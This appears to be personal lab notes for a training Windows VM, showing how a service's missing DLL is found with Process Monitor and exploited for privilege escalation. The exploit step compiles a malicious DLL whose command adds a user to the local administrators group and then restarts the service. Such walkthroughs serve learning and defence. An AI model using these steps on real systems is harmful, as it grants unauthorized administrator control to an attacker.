#Windows #PrivEsc #DLLHijacking #x86_64-w64-mingw32-gcc #gcc-mingw-w64 #sc #procmon #ProcessMonitor

**Detection**

Windows VM

1. Open the Tools folder that is located on the desktop and then go the Process Monitor folder.  
2. In reality, executables would be copied from the victim’s host over to the attacker’s host for analysis during run time. Alternatively, the same software can be installed on the attacker’s host for analysis, in case they can obtain it. To simulate this, right click on `Procmon.exe` and select ‘Run as administrator’ from the menu.  
3. In `procmon`, select "filter".  From the left-most drop down menu, select ‘Process Name’. 
4. In the input box on the same line type: `dllhijackservice.exe`  
5. Make sure the line reads “Process Name is `dllhijackservice.exe` then Include” and click on the ‘Add’ button, then ‘Apply’ and lastly on ‘OK’.  
6. Next, select from the left-most drop down menu ‘Result’.  
7. In the input box on the same line type: `NAME NOT FOUND`  
8. Make sure the line reads “Result is NAME NOT FOUND then Include” and click on the ‘Add’ button, then ‘Apply’ and lastly on ‘OK’.  
9. Open command prompt and type: `sc start dllsvc`  
10. Scroll to the bottom of the window. One of the highlighted results shows that the service tried to execute ‘`C:\Temp\hijackme.dll`’ yet it could not do that as the file was not found. Note that ‘`C:\Temp`’ is a writable location.

**Exploitation**

Windows VM

1. Copy ‘`C:\Users\User\Desktop\Tools\Source\windows_dll.c`’ to the Kali VM.
	- Create a python ftp server on LHOST using `pyftpdlib`
```
┌──(root㉿kali)-[~/Downloads]
└─# python3 -m pyftpdlib -p 21 --write       
/usr/lib/python3/dist-packages/pyftpdlib/authorizers.py:108: RuntimeWarning: write permissions assigned to anonymous user.
  self._check_permissions(username, perm)
[I 2024-10-08 08:53:29] concurrency model: async
[I 2024-10-08 08:53:29] masquerade (NAT) address: None
[I 2024-10-08 08:53:29] passive ports: None
[I 2024-10-08 08:53:29] >>> starting FTP server on 0.0.0.0:21, pid=715492 <<<

```
- Transfer file from RHOST to LHOST - with `cmd.exe` in directory of file to transfer to LHOST:
```
... [Windows RHOST as user]

> ftp [LHOST IP - Kali VM]

ftp> anonymous:anonymous

ftp> put windows_service.c

... [Kali VM - ftp server] ...

[I 2024-10-08 09:02:07] 10.10.53.82:49232-[] FTP session opened (connect)
[I 2024-10-08 09:02:12] 10.10.53.82:49232-[anonymous] USER 'anonymous' logged in.
[I 2024-10-08 09:02:20] 10.10.53.82:49232-[anonymous] STOR /root/Downloads/windows_dll.c completed=1 bytes=417 seconds=0.488

```

Kali VM

1. Open `windows_dll.c` in a text editor and replace the command used by the `system()` function to: `cmd.exe /k net localgroup administrators user /add`  
2. Exit the text editor and compile the file by typing the following in the command prompt: `x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll`  
3. Copy the generated file `hijackme.dll`, to the Windows VM.

Windows VM

1. Place `hijackme.dll` in ‘`C:\Temp`’.  
2. Open command prompt and type: `sc stop dllsvc & sc start dllsvc`  
3. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: `net localgroup administrators`
